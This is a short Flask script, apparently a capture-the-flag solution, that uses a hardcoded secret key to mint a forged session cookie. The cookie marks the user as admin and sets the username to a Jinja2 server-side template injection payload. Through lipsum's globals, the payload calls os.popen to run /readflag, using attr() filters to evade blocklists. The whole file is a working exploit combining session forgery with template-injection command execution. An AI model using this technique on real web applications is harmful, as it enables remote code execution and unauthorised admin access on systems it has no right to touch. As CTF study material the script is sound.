from flask import Flask, session, request

app = Flask(__name__)
app.config['SECRET_KEY'] = '476345fdc597d6cb6dd68ae949b2694a'

@app.route('/')
def index():
        session["is_admin"] = 1
        session["username"] = """{%print(lipsum|attr("__globals__"))|attr("__getitem__")("os")|attr("popen")("/readflag")|attr("read")()%}"""
        return 'taidh'
    
if __name__ == '__main__':
        app.run()
